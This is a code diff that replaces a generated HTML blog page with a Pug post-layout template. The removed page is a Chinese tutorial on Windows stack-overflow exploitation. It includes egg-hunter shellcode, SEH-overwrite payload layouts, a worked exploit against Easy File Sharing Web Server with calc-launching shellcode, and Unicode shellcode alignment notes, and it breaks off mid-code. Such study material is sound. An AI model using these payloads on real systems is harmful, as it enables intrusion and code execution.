@@ -1,603 +1,107 @@
-<!DOCTYPE HTML>
-<html class="no-js" lang="zh-CN">
-<!--
-//                            _ooOoo_
-//                           o8888888o
-//                           88" . "88
-//                           (| -_- |)
-//                            O\ = /O
-//                        ____/`---'\____
-//                      .   ' \\| |// `.
-//                       / \\||| : |||// \
-//                     / _||||| -:- |||||- \
-//                       | | \\\ - /// | |
-//                     | \_| ''\---/'' | |
-//                      \ .-\__ `-` ___/-. /
-//                   ___`. .' /--.--\ `. . __
-//                ."" '< `.___\_<|>_/___.' >'"".
-//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
-//                 \ \ `-. \_ __\ /__ _/ .-` / /
-//         ======`-.____`-.___\_____/___.-`____.-'======
-//                            `=---='
-//                 拦截插件累计拦截逗比攻击"1381438"次！
-//         .............................................
-//                  佛祖保佑             永无BUG
-//          佛曰:
-//                  写字楼里写字间，写字间里程序员；
-//                  程序人员写程序，又拿程序换酒钱。
-//                  酒醒只在网上坐，酒醉还来网下眠；
-//                  酒醉酒醒日复日，网上网下年复年。
-//                  但愿老死电脑间，不愿鞠躬老板前；
-//                  奔驰宝马贵者趣，公交自行程序员。
-//                  别人笑我忒疯癫，我笑自己命太贱；
-//                  不见满街漂亮妹，哪个归得程序员？
--->
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!--[if lte IE 9]>
-<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
-<![endif]-->
-<meta charset="utf-8">
+extends includes/layout.pug
 
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+block top_img
+  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
+  if (top_img && page.top_img !== false)
+    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+    - var flag = top_img === true ? 'no-bg' : ''
+    div#top-container(style=bg_img class=flag)
+      include ./includes/header.pug
+      #post-info
+        #post-title= page.title || _p('no_title')
+        #post-meta
+          if (theme.post_meta.date_type)
+            if (theme.post_meta.date_type === 'both')
+              time.post-meta__date
+                i.fa.fa-calendar(aria-hidden="true")
+                =' '+_p('post.created')+' '+date(page.date, config.date_format)
+                span.post-meta__separator |
+                i.fa.fa-calendar-check-o(aria-hidden="true")
+                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+            else
+              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+          if (theme.post_meta.categories && page.categories.data.length > 0)
+            if (theme.post_meta.date_type)
+              span.post-meta__separator |
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                 i.fa.fa-angle-right(aria-hidden="true")
+          if (theme.disqus.enable && theme.disqus.count)
+            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+              span.post-meta__separator |
+            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
+            a(href=url_for(page.path) + '#disqus_thread')
+              span.disqus-comment-count(data-disqus-identifier=page.path)
+          if (theme.wordcount && theme.wordcount.enable)
+            .post-meta-wordcount
+              span= _p('post.wordcount') + ': '
+              span.word-count= wordcount(page.content)
+              span.post-meta__separator |
+              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+  else
+    div#top-container.plain
+      include ./includes/header.pug
 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-<meta name="renderer" content="webkit">
-<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
-<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
-<meta name="author" content="treebacker">
-<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
-
-<link rel="shortcut icon" href="../../../../images/favicon.png">
-
-
-<title>windows下栈溢出利用总结 - Watch Security</title>
-
-<meta name="keywords" content="pwn">
-
-<meta name="description " content="windows">
-
-</head>
-<body>
-<div id="nav">
-    <nav class="nav-menu">
-        <a class="site-name current" href="/" title="Tree">Tree</a>
-        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
-        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
-        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
-        <!-- custom single page of menus -->
-        
-        
-        <a href="/help" title="帮助">
-            <i class="fa fa-question-circle"></i>
-            <span>帮助</span>
-        </a>
-        
-    </nav>
-</div>
-
-<div class="nav-user">
-    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
-    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
-    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
-</div>
-
-<div id="wrapper" class="clearfix">
-    <div id="body">
-        <div class="main" id="main">
-            <div id="cover">
-    <div class="cover-img"></div>
-    <div class="cover-info">
-        
-        <h1 class="cover-siteName">Treebacker</h1>
-        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
-        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
-        <div class="cover-sns">
-            
-            <div class="btn btn-github">
-                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
-                    <i class="fa fa-github"></i>
-                </a>
-            </div>
-            
-        </div>
-    </div>
-</div>
-            <div class="page-title">
-    <ul>
-        <li><a href="/">最新</a></li>
-        
-            
-                <li class="active">
-                    <a href="/categories/tech-notes" data-name="技术">技术</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/essays" data-name="随笔">随笔</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/others" data-name="其他">其他</a>
-                </li>
-            
-        
-        <li class="page-search">
-    <form id="search" class="search-form">
-        <label for="s" class="sr-only">请输入关键字</label>
-        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
-        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
-</div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(无标题)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '../../../../content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-</li>
-
-    </ul>
-</div>
-<div class="main-inner">
-    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-        <div class="post-header">
-            <div class="post-author clearfix">
-                <a class="avatar fleft" href="" target="_blank">
-                    <img width="48" src="/images/favicon.png" alt="avatar">
-                </a>
-                <p><span class="label">作者</span>
-                    <a href="" target="_blank">Treebacker</a>
-                    <span title="最后编辑于2019-10-04">2019-10-04</span>
-                </p>
-                <p></p>
-            </div>
-            <h2 class="post-title">Windows下栈溢出利用总结</h2>
-            <div class="post-meta">
-                本文总共14579个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
-            </div>
-        </div>
-        <div class="post-content markdown-body">
-            <h3 id="Windows下栈溢出利用"><a href="#Windows下栈溢出利用" class="headerlink" title="Windows下栈溢出利用"></a>Windows下栈溢出利用</h3><h4 id="一般技巧"><a href="#一般技巧" class="headerlink" title="一般技巧"></a>一般技巧</h4><ul>
-<li><h5 id="JMP-ESP"><a href="#JMP-ESP" class="headerlink" title="JMP ESP"></a>JMP ESP</h5><ul>
-<li>作为一种经典的利用方式，不应该被忘记。<ul>
-<li>在XP及之前的系统中，很多固定的地址有这样的指令。且并没有DEP保护。</li>
-<li>除了系统的，在程序自身的代码中，也可能找到jmp esp。</li>
-<li>类推的，jmp reg或许也是一个思路，只要该reg是我们可以控制的。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><h5 id="Short-Jmp"><a href="#Short-Jmp" class="headerlink" title="Short Jmp"></a>Short Jmp</h5><ul>
-<li>当shellcode的一部分执行，一部分却中断时。可以使用这种方式“滑梯式”地完成利用。</li>
-<li>一般这种方式，也可以利用第一种方式填充合适的nop来完成。</li>
-</ul>
-</li>
-<li><h5 id="Egg-hunter"><a href="#Egg-hunter" class="headerlink" title="Egg hunter"></a>Egg hunter</h5><ul>
-<li><p>当缓冲区空间不够大时，我们可以利用这种技术，写入一段用来搜索shellcode的代码，搜索真正的shellcode执行。</p>
-</li>
-<li><p>该技术可以在多个平台使用，只是实现的依赖不同 。</p>
-</li>
-<li>Linux下，依赖system call来处理搜索过程的“非法访问”<ul>
-<li>常用的有access(0x21)、和sigaction（0x43），前者每次检查一个地址（4byte），后者可以检查16byte。</li>
-</ul>
-</li>
-<li>Windows通常有两种思路<ul>
-<li>实现一个SEH来处理非法访问</li>
-<li>也用system call，一般是NtDisplayString 、IsBadReadPtr</li>
-</ul>
-</li>
-<li>示例基于NtDisplayString技术</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6681</span>CAFF0F     <span class="keyword">or</span> dx,<span class="number">0x0fff</span>            ;通过添加循环遍历内存中的页面</span><br><span class="line"><span class="number">42</span>             inc edx                    ;循环遍历每一个地址                </span><br><span class="line"><span class="number">52</span>             push edx                ;入栈操作                </span><br><span class="line"><span class="number">6</span>A43         push byte +<span class="number">0x43</span>         ;NtDisplayString的系统调用ID            </span><br><span class="line"><span class="number">58</span>             pop eax                 ;出栈操作，其实就是作参数</span><br><span class="line">CD2E         <span class="keyword">int</span> <span class="number">0x2e</span>                 ;调用NtDisplayString            </span><br><span class="line"><span class="number">3</span>C05        cmp al,<span class="number">0x5</span>                 ;对比操作</span><br><span class="line"><span class="number">5</span>A            pop edx                    ;出栈操作                </span><br><span class="line"><span class="number">74</span>EF        jz <span class="number">0x0</span>                     ;如果ZF标志由CMP指令设置，则存在访问冲突</span><br><span class="line">;无效页面，回到顶部</span><br><span class="line">B874303077    mov eax,<span class="number">0x7a757368</span>        ;标签(<span class="number">7</span>a <span class="number">75</span> <span class="number">73</span> <span class="number">68</span> = zush) </span><br><span class="line"><span class="number">8B</span>FA        mov edi,edx                ;将EDI设置为EDX的当前地址指针以用于SCASD指令        </span><br><span class="line">AF            scasd                     ;将EAX中的值与DWORD值进行比较</span><br><span class="line">;在SCASD比较后相应地设置EFLAGS寄存器,这里比较两次才算真正的发现shellcode</span><br><span class="line"><span class="number">75</span>EA        jnz <span class="number">0x5</span> </span><br><span class="line">AF            scasd                                                 </span><br><span class="line"><span class="number">75E7</span>        jnz <span class="number">0x5</span></span><br><span class="line">FFE7        jmp edi</span><br><span class="line"></span><br><span class="line"><span class="string">"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"</span></span><br><span class="line">egg</span><br><span class="line"><span class="string">"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>注意，这种方式利用，最终执行的shellcode不一定是在栈上，很可能在内存中其他的地方也会有我们输入的copy内容。</li>
-<li>hunter里面有一个egg，所以作为有效payload的标志就应该是两个egg。</li>
-</ul>
-</li>
-<li><h5 id="SEH-HANDLER覆盖"><a href="#SEH-HANDLER覆盖" class="headerlink" title="SEH  HANDLER覆盖"></a>SEH  HANDLER覆盖</h5><ul>
-<li><p>栈溢出经常会导致内存的非法访问（读、写、执行），触发异常。而鉴于<a href="">Windows的SEH机制</a>，且SEH结构存在栈上。</p>
-<p>​     <img src="/2019/10/04/Windows下栈溢出利用总结/1.png" title="[]"></p>
-<p>​     <img src="/2019/10/04/Windows下栈溢出利用总结/2.png" title="[]"></p>
-</li>
-<li><p>溢出利用。我们可以覆盖SEH链，每个SEH结构有两个指针，第一个指向下一个SEH结构，第二个指向当前SEH的处理函数。组合利用如下</p>
-<ul>
-<li><p>将指向下一个SEH的指针覆盖为shellcode地址。将指向当前SEH处理函数的指针指向”pop pop ret”操作。</p>
-</li>
-<li><p>触发SEH。</p>
-</li>
-<li><p>执行”pop pop ret”，将下一条记录的值作为EIP。跳转到shellcode。</p>
-</li>
-<li><p>覆盖布置</p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">junk + nseh + seh + nops + shellcode</span><br><span class="line">					<span class="comment">#nseh is the shellcode_addr or jmp to shellcode or egg hunter</span></span><br><span class="line">    				<span class="comment">#seh is "pop pop ret"'s addr</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h4><ul>
-<li><p>除了类似于Linux下的DEP、ALSR、NX、RELOC之外。</p>
-</li>
-<li><h5 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h5><ul>
-<li>在进入SEH前，将所有寄存器xor操作清零，防止利用。</li>
-</ul>
-</li>
-<li><h5 id="SAFESEH"><a href="#SAFESEH" class="headerlink" title="SAFESEH"></a>SAFESEH</h5><ul>
-<li>如果异常处理链不在当前程序的栈中，则终止异常处理调用。</li>
-</ul>
-<ol start="2">
-<li>如果异常处理函数的指针指向当前程序的栈中，则终止异常处理调用。</li>
-<li>在前两项检查都通过后，调用 RtlIsValidHandler() 进行异常处理有效性检查。</li>
-<li>绕过的话，一般找没有启用safeseh的模块里的”pop pop ret”来绕过。</li>
-</ol>
-</li>
-<li><h5 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h5><ul>
-<li><p>系统级别地验证SEH链表的完整性（不需要应用程序开启什么）。</p>
-</li>
-<li><p>SEHOP的全称是Structured Exception Handler Overwrite Protection（结构化<br>异常处理覆盖保护）,SEHOP的核心是检测程序栈中的所有SEH结构链表，特<br>别是最后一个SEH结构，它拥有一个特殊的异常处理函数指针，指向的是一<br>个位于NTDLL中的函数。异常处理时，由系统接管分发异常处理，因此上面<br>描述的检测方案完全可以由系统独立来完成，正因为SEH的这种与应用程序<br>的无关性，因此应用程序不用做任何改变，你只需要确认你的系统开启了<br>SEHOP即可。</p>
-<img src="/2019/10/04/Windows下栈溢出利用总结/17.png" title="[]">
-</li>
-<li><p>详细介绍及绕过方法<a href="[https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/EN-Bypassing%20SEHOP.pdf](https://repo.zenk-security.com/Techniques d.attaques  .  Failles/EN-Bypassing SEHOP.pdf">Paper</a>)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SEH handler should point onto a non-SafeSEH module</span><br><span class="line">• The page should be executable</span><br><span class="line">• The SEH chain should not be altered and must end with a SEH structure containing a special</span><br><span class="line">value (0xFFFFFFFF as next SEH structure pointer and a specific value as SEH handler)</span><br><span class="line">• All SEH structures should be 4-byte aligned</span><br><span class="line">• Last SEH structure&apos;s handler should point right into ntdll to ntdll!FinalExceptionHandler routine</span><br><span class="line">• All SEH pointers should point to stack locations</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li>利用je指令0x74是地址对齐的，可以绕过检查；然后就是伪造SEH。这里为了让JE指令生效，handler覆盖不再是’pop pop ret’，而是’xor pop pop ret’。</li>
-</ul>
-<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><ul>
-<li>Canary</li>
-<li>SAFESEH</li>
-<li>SEHOP</li>
-<li>DEP</li>
-</ul>
-<h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><ul>
-<li><h5 id="HALLIBURTON-LOGVIEW-PRO-9-7-5-、10-0-1拒绝服务漏洞"><a href="#HALLIBURTON-LOGVIEW-PRO-9-7-5-、10-0-1拒绝服务漏洞" class="headerlink" title="HALLIBURTON LOGVIEW PRO 9.7.5 、10.0.1拒绝服务漏洞"></a>HALLIBURTON LOGVIEW PRO 9.7.5 、10.0.1拒绝服务漏洞</h5></li>
-<li><p><a href="https://www.exploit-db.com/apps/dbce915ea07d5f6367e0e9d93b3ddbac-Halliburton_Log_Viewer.exe" target="_blank" rel="noopener">软件下载</a></p>
-</li>
-<li><p><a href="https://www.exploit-db.com/exploits/40192" target="_blank" rel="noopener">关于漏洞</a></p>
-</li>
-<li><p>分析过程</p>
-<ul>
-<li><p>长度足够的POC。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="string">"payload.cgm"</span></span><br><span class="line">buffer = <span class="string">"a"</span>*<span class="number">0x1000</span></span><br><span class="line">file = open(file, <span class="string">"w"</span>)</span><br><span class="line">file.write(buffer)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>在debuger里看到crash的状态</p>
-<ul>
-<li><p>调用栈状态</p>
-<img src="/2019/10/04/Windows下栈溢出利用总结/5.png" title="[]">
-</li>
-<li><p>可以看到我们已经覆盖了SEH</p>
-<ul>
-<li><img src="/2019/10/04/Windows下栈溢出利用总结/6.png" title="[]">
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>在IDA里溯源，根据调用栈的地址找到最近的调用（在AXCGMV.ocx控件链接库里）。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:1018A66D                                         ; sub_1018A310+393j ...</span><br><span class="line">.text:1018A66D                 mov     ecx, [esp+0C8h+var_4]</span><br><span class="line">.text:1018A674                 pop     edi</span><br><span class="line">.text:1018A675                 pop     esi</span><br><span class="line">.text:1018A676                 pop     ebp</span><br><span class="line">.text:1018A677                 pop     ebx</span><br><span class="line">.text:1018A678                 xor     ecx, esp</span><br><span class="line">.text:1018A67A                 call    @__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">.text:1018A67F                 add     esp, 0B8h</span><br><span class="line">.text:1018A685                 retn</span><br></pre></td></tr></table></figure>
-<ul>
-<li>可以看到，其实是由于我们覆盖了SEH，而进行了security检查（Safeseh的流程），失败后终止了程序。</li>
-</ul>
-</li>
-<li><p>这里的SafeSeh暂时不会饶过，记下了。。。</p>
-</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><h5 id="Easy-File-Sharing-Web-Server栈溢出覆盖SEH"><a href="#Easy-File-Sharing-Web-Server栈溢出覆盖SEH" class="headerlink" title="Easy File Sharing Web Server栈溢出覆盖SEH"></a>Easy File Sharing Web Server栈溢出覆盖SEH</h5><ul>
-<li><p><a href="https://www.exploit-db.com/exploits/42261/" target="_blank" rel="noopener">软件下载及漏洞详情</a></p>
-</li>
-<li><p>漏洞分析</p>
-<ul>
-<li><p>触发</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="number">3000</span> * <span class="string">"a"</span></span><br></pre></td></tr></table></figure>
-<img src="/2019/10/04/Windows下栈溢出利用总结/7.png" title="[]">
-</li>
-<li><p>SEH已经被覆盖</p>
-<img src="/2019/10/04/Windows下栈溢出利用总结/8.png" title="[]">
-</li>
-<li><p>偏移量确定后，搜索有用的指令”pop pop set”，重新编辑payload</p>
-<ul>
-<li>注意格式是pad + nseh + seh + shellcode</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pad = <span class="string">"/.:/"</span>        <span class="comment"># 不常见，但必须</span></span><br><span class="line">pad += <span class="string">"a"</span>*<span class="number">53</span>   <span class="comment"># 测试字符串</span></span><br><span class="line">nseh = <span class="string">"\xeb\x14\x90\x90"</span>   <span class="comment">#jmp 0x14 nop nop</span></span><br><span class="line">seh = <span class="string">"\x58\x88\x01\x10"</span>	<span class="comment">#0x100194bf pop pop ret</span></span><br><span class="line">nops = <span class="string">"\x90"</span>*<span class="number">20</span>			<span class="comment"># nop * 2018</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xC9"</span>                    <span class="comment"># xor ecx,ecx</span></span><br><span class="line">shellcode += <span class="string">"\x51"</span>                        <span class="comment"># push ecx</span></span><br><span class="line">shellcode += <span class="string">"\x68\x63\x61\x6C\x63"</span>        <span class="comment"># push 0x636c6163</span></span><br><span class="line">shellcode += <span class="string">"\x54"</span>                        <span class="comment"># push dword ptr esp</span></span><br><span class="line">shellcode += <span class="string">"\xB8\xAD\x23\x86\x7C"</span>        <span class="comment"># mov eax,0x7c8623AD</span></span><br><span class="line">shellcode += <span class="string">"\xFF\xD0"</span>                    <span class="comment"># call eax</span></span><br><span class="line"></span><br><span class="line">exploit = pad + nseh + seh + nops + shellcode</span><br><span class="line">exploit = exploit.ljust(<span class="number">3000</span>, <span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><h5 id="Unicode程序漏洞利用"><a href="#Unicode程序漏洞利用" class="headerlink" title="Unicode程序漏洞利用"></a>Unicode程序漏洞利用</h5><ul>
-<li><p>shellcode不能有截断字符’\x00’，但是unicode绝大部分都是在前加’\x00’</p>
-</li>
-<li><p>实例Triologic Media Player 8</p>
-<ul>
-<li><p>触发漏洞状态。</p>
-<img src="/2019/10/04/Windows下栈溢出利用总结/10.png" title="[]">
-<img src="/2019/10/04/Windows下栈溢出利用总结/11.png" title="[]">
-</li>
-<li><p>可以看到，该程序适宜unicode编码的，我们所有的输入也是被转为unicode。</p>
-</li>
-<li><p>依然测出seh的偏移，这次我们只用2byte的nseh和seh来覆盖，看看unicode模式下是什么样的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">padding = <span class="string">"a"</span>*<span class="number">536</span></span><br><span class="line">nseh = <span class="string">"nn"</span></span><br><span class="line">seh = <span class="string">"ss"</span></span><br><span class="line">exploit = padding + nseh + seh + <span class="string">"a"</span>*<span class="number">4464</span></span><br></pre></td></tr></table></figure>
-<img src="/2019/10/04/Windows下栈溢出利用总结/12.png" title="[]">
-<p>可以看到两个”n”和”s”分别扩展为0x006e006e和0x00730073，</p>
-</li>
-<li><h6 id="什么样的seh和nseh合适？"><a href="#什么样的seh和nseh合适？" class="headerlink" title="什么样的seh和nseh合适？"></a>什么样的seh和nseh合适？</h6><ul>
-<li><p>在ascii编码下，seh是”pop pop ret”指令的地址。地址是有可能满足的。phrack在paper里这样说的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Under Win32 plateforms, a process usually starts at 00401000, this makes</span><br><span class="line">      it possible to smash EIP with a return address that looks like : </span><br><span class="line"></span><br><span class="line">                               ????:00??00??</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<pre><code>  mona插件也提供了unicode格式指令的搜索
-
-  {% asset_img 13.png[] %}
-
-* 但是nseh之前是jmp指令（类似&quot;\xeb\xff\x90\x90&quot;)，显然在unicode下是办不到的。但是我们可以使用一些无害的指令填充。如下
-
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    ASCII   ==&gt; ...AAAA...</span><br><span class="line">    Unicode ==&gt; ...0041004100410041...</span><br><span class="line">     </span><br><span class="line">    But lets see what this looks like when it gets translated to instructions:</span><br><span class="line">    ...</span><br><span class="line">    41         INC ECX</span><br><span class="line">    004100     ADD BYTE PTR DS:[ECX],AL</span><br><span class="line">    41         INC ECX</span><br><span class="line">    004100     ADD BYTE PTR DS:[ECX],AL</span><br><span class="line">    ...</span><br><span class="line">     </span><br><span class="line">    So this is very very interesting! It seems like one byte will remain intact and the following byte will </span><br><span class="line">    &quot;absorb&quot; both 00&apos;s. What we will want to do is replace this second byte with an instruction that, when </span><br><span class="line">    executed, will be harmless (FYI 0x004100 is not a harmless instruction). You might call this a unicode NOP</span><br><span class="line">    or Venetian Shellcode since canceling out 00&apos;s is similar to closing Venetian blinds. There are a couple </span><br><span class="line">of candidates to absorb these 00&apos;s (these won&apos;t always be suitable):</span><br><span class="line">    </span><br><span class="line">     	  006E00     ADD BYTE PTR DS:[ESI],CH</span><br><span class="line">          006F00     ADD BYTE PTR DS:[EDI],CH</span><br><span class="line">          007000     ADD BYTE PTR DS:[EAX],DH</span><br><span class="line">          007100     ADD BYTE PTR DS:[ECX],DH</span><br><span class="line">          007200     ADD BYTE PTR DS:[EDX],DH</span><br><span class="line">          007300     ADD BYTE PTR DS:[EBX],DH</span><br></pre></td></tr></table></figure>
-</code></pre><ul>
-<li><p>测试一下，（不是所有的”pop pop ret”地址都可用，因为nseh地址之后也会作为指令执行）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">padding = <span class="string">"a"</span>*<span class="number">536</span></span><br><span class="line">      nseh = <span class="string">"\x41\x71"</span></span><br><span class="line">seh = <span class="string">"\x41\x4d"</span></span><br><span class="line">      exploit = padding + nseh + seh + <span class="string">"a"</span>*<span class="number">4464</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<pre><code>可以看到，已经执行了&quot;pop pop ret&quot;，且来到了指令&quot;\x41\x00\x71&quot;。
-​    {% asset_img 14.png [] %}
-     {% asset_img 15.png [] %}
-</code></pre><ul>
-<li><h6 id="shellcode的布置"><a href="#shellcode的布置" class="headerlink" title="shellcode的布置"></a>shellcode的布置</h6><ul>
-<li>由于我们没有jmp到shellcode。所以需要手动将shellcode与某个寄存器对齐。（注意是指向shellcode第一个字节，而不是填充的nop）。一般是eax，因为汇编指令集对eax的优化，使得很多指令在eax上使用更方便（一字节）便于unicode编码。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(1)找一个最接近我们缓冲区的寄存器然后通过增加/减小一些值使得它指向缓冲区的起始地址(也就是				Shellcode的地址) </span><br><span class="line">(2在堆栈找一个指向我们缓冲区的地址, 通过pop送到EIP最终会转去执行我们的Shellcode.</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<pre><code>* 这里我们用第一种方式。
-
-  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">align = (</span><br><span class="line"><span class="string">'\x55'</span></span><br><span class="line"><span class="string">'\x71'</span></span><br><span class="line"><span class="string">'\x58'</span></span><br><span class="line"><span class="string">"\x71"</span>                      <span class="comment">#Venetian Padding</span></span><br><span class="line"><span class="string">"\x05\x20\x11"</span>              <span class="comment">#add eax,0x11002000  \</span></span><br><span class="line"><span class="string">"\x71"</span>                      <span class="comment">#Venetian Padding     |&gt; +300</span></span><br><span class="line"><span class="string">"\x2d\x17\x11"</span>              <span class="comment">#sub eax,0x11001700  /</span></span><br><span class="line"><span class="string">"\x71"</span>                      <span class="comment">#Venetian Padding</span></span><br><span class="line"><span 